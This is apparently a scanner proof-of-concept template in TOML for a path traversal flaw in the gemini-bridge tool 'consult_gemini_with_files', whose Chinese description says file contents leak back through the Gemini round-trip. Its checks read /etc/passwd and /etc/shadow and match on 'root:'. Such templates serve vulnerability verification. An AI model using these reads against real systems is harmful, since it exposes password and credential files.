[info]
author = "ave"
description = "验证 gemini-bridge 1.0.0-1.3.0 中 consult_gemini_with_files 工具的路径遍历漏洞（CWE-22），通过绝对路径、../ 遍历或符号链接逃逸读取工作目录外的任意文件，文件内容经 Gemini 往返回显泄露"
id = "POC-AVE-2026-0802"
name = "gemini-bridge consult_gemini_with_files 任意文件读取 PoC"
severity = "medium"
tags = ["ave-2026-0802"]
vuln_id = [
    "CVE-2026-54785",
    "AVE-2026-0802",
]

[poc]
logic = "any"

[[poc.requests]]
path = "/etc/passwd"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]

[[poc.requests]]
path = "/etc/shadow"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
